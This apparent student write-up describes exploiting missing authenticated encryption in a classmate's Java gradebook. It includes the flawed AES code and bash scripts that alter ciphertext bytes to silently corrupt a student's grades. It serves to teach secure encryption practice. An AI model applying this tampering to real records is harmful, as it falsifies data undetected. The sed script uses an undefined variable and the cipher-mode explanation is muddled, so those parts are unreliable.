---
title: Exploiting a Security Vulnerability in a Java Program
---

## Overview

As the final project for a software/network security class I took during my sophomore year, I was given the task of finding security vulnerabilities in a gradebook program developed by my peers. It may be hard to follow this post (most of the source code had to be omitted), but the key lessons here are:

1. Always specify your parameters when encrypting data, do not use defaults!
2. Use some kind of authenticated encryption scheme when you want to detect tampering.

**Disclaimer: This vulnerability was found in a "toy" Java program, and is simply an example of poor programming practices. Do not try to exploit a program without explicit permission from the developer(s).**


## Gradebook Implementation

### Gradebook Encryption and Decryption

```java
private byte[] encryptData(String data, String keyString) throws IOException {
    try {
      byte[] keyBytes = Base64.getDecoder().decode(keyString);
      SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
      Cipher cipher = Cipher.getInstance("AES");
      cipher.init(Cipher.ENCRYPT_MODE, secretKey);
      return cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
    } catch (Exception e) {
      throw new IOException("Error while encrypting data", e);
    }
  }

  private String decryptData(byte[] encryptedData, String keyString) throws IOException {
    try {
      byte[] keyBytes = Base64.getDecoder().decode(keyString);
      SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
      Cipher cipher = Cipher.getInstance("AES");
      cipher.init(Cipher.DECRYPT_MODE, secretKey);
      byte[] decryptedBytes = cipher.doFinal(encryptedData);
      String decryptedData = new String(decryptedBytes, StandardCharsets.UTF_8);
      return decryptedData;
    } catch (Exception e) {
      throw new IOException("Error while decrypting data", e);
    }
  }
```

### Gradebook Key Generation and Storage

```java
// KEY GENERATION
try {
    KeyGenerator keyGen = KeyGenerator.getInstance("AES");
    keyGen.init(256); // using 256 bits
    SecretKey secretKey = keyGen.generateKey();
    byte[] keyHash = hashKey(secretKey);
    if (keyHash == null) {
	    System.err.println("Failed to hash the key");
	    System.exit(255);
    }

    // Write the hash to the file
    try {
	    String keyHashString = Base64.getEncoder().encodeToString(keyHash);
        System.out.println("Base64 Encoded Hashed Key: " + keyHashString);
        Files.write(Paths.get(filename), (keyHashString + System.lineSeparator()).getBytes());
    } catch (IOException e) {
        System.err.println("Error writing key hash to file!");
	    e.printStackTrace();
	    System.exit(255);
    }

    // Convert key to String for display
    String encodedKey = Base64.getEncoder().encodeToString(secretKey.getEncoded());
    System.out.println("Key is " + encodedKey); // Print encoded key
    } catch (NoSuchAlgorithmException e) {
      System.err.println("Error generating keys!");
      e.printStackTrace();
      System.exit(255);
}
```

## The Vulnerability 

The manner in which hashed key values are handled by the gradebook program is extremely problematic. The hash value is placed at the very beginning of the ciphertext, which means an attacker can easily identify the hash value's location by examining the ciphertext, enabling them to modify the ciphertext without altering the hash value. Additionally, there's no integrity check using the hash value in the encryptData or decryptData functions, so this program fails to detect ciphertext tampering.

### Encrypted Gradebook File

```markdown
YBmzZqZNUyoiLdIOrjIFV6Cy4vyhLV6x2l8wFtkBozo=
l65415fAysfy12+49AtY/cHvdNcjLXERZRr9IUWEnK+ZvlO5H/X1nOh4y5eNDW/Iv+ycb15RbzLkd+DF/g1f5ZKeJNO48yRwVn7kDk3JT6+8vCy1qcTFXfPs9USH/ISUcUlCGRqoRuyRpEIl3qxg2Wo/K0fhkqIb44eTsSTdpvm5vgLyI7HW044dcihU00/av7atB1w6dYKCG7ai4+x/AWB0chxde1Z/hq/Db2GL9rL8aHomCLS5DlzVb+int0gbUE7/FMPS3DbRgqnbHetbzIbh/xKLb/vRj+6r0jt/BQGelZH+dpACZTXIe8Nk5TS9mFNfIBG1tHEpl6aTtI6jPx+eMKforCXXNmjJgcGD6+V6oTFs59UWW2DS1RW+xmTw
```

We can deduce that the first line of the encrypted gradebook is the hashed value of the key.

## The Exploit

Because we can modify the gradebook without being detected, letâ€™s write some shell scripts to automate an attack.

### Creating a new Gradebook

This script will set up the environment for our attack by:

1. Creating a valid gradebook + key pair.
2. Filling the gradebook with valid student information.
3. Encrypting the data and writing it to a file.

```bash
#!/bin/bash


echo ""
echo ""


# Clean any previoulsy built files and make a fresh one
make clean
make

rm mygradebook
./setup -N mygradebook

# Ask the user the input the key generated by the program
echo ""
read -p "Input The Key Printed Above : " key
echo ""
echo "Key is: $key"
echo ""

./gradebookadd -N mygradebook -K $key -AS -FN John -LN Smith
./gradebookadd -N mygradebook -K $key -AS -FN Russell -LN Tyler
./gradebookadd -N mygradebook -K $key -AS -FN Ted -LN Mason


./gradebookadd -N mygradebook -K $key -AA -AN Midterm -P 100 -W 0.25
./gradebookadd -N mygradebook -K $key -AG -AN Midterm -FN John -LN Smith -G 95
./gradebookadd -N mygradebook -K $key -AG -AN Midterm -FN Russell -LN Tyler -G 80
./gradebookadd -N mygradebook -K $key -AG -AN Midterm -FN Ted -LN Mason -G 90

./gradebookadd -N mygradebook -K $key -AA -AN Final -P 200 -W 0.5
./gradebookadd -N mygradebook -K $key -AG -AN Final -FN John -LN Smith -G 180
./gradebookadd -N mygradebook -K $key -AG -AN Final -FN Russell -LN Tyler -G 190
./gradebookadd -N mygradebook -K $key -AG -AN Final -FN Ted -LN Mason -G 195

./gradebookadd -N mygradebook -K $key -AA -AN Project -P 50 -W 0.25
./gradebookadd -N mygradebook -K $key -AG -AN Project -FN John -LN Smith -G 48
./gradebookadd -N mygradebook -K $key -AG -AN Project -FN Russell -LN Tyler -G 49
./gradebookadd -N mygradebook -K $key -AG -AN Project -FN Ted -LN Mason -G 50


```

### Modifying the Gradebook

This script will initiate the attack by changing the 189th and 190th characters on the second line of the encrypted gradebook file to zeros.

```bash
#!/bin/bash

path="mygradebook"

line=2
position1=189
position2=190

# Substituting characters at positions 189 and 190 to corrupt assignment data.
# Any character substitution at positions 185 to 192 will result in Ted's
# final and midterm assignments being corrupted, so we are arbitrarily choosing
# two of these locations to ensure a successful attack.
sed -i "${line_number}s/./0/${position1}" "$path"
sed -i "${line_number}s/./0/${position2}" "$path"

echo ""
echo "Gradebook Exploited. Ted is now failing."
echo ""

```

### Displaying the Gradebook

This script will use the key to display the gradebook before and after the exploit.

```bash
#!/bin/bash

echo ""
read -p "Input The Key : " key
echo ""
echo "Key is: $key"
echo ""

echo "Grades of midterm:"
echo ""
./gradebookdisplay -N mygradebook -K $key -PA -A -AN Midterm
echo ""

echo "Grades of project:"
echo ""
./gradebookdisplay -N mygradebook -K $key -PA -A -AN Project
echo ""

echo "Grades of final:"
echo ""
./gradebookdisplay -N mygradebook -K $key -PA -A -AN Final
echo ""

echo "Final grades:"
echo ""
./gradebookdisplay -N mygradebook -K $key -PF -G
echo ""

```

## The Result

This attack works because the gradebook program does not authenticate gradebook files properly. In the encryptData function, gradebooks are encrypted using AES without a specified CBC mode. The implementation does not explicitly include parameters for an AEAD mode like GCM, so we know that the encryption does not provide authenticity or integrity by default. Below are some screenshots of the exploit in action.

![Constructing the Gradebook](/images/gradebook-setup.png)

Notice how Ted has the best final grade before the exploit is executed.

![The Original Gradebook](/images/gradebook-initial.png)

Notice how Ted has a failing grade after the gradebook is modified.

![The Exploited Gradebook](/images/gradebook-exploit.png)

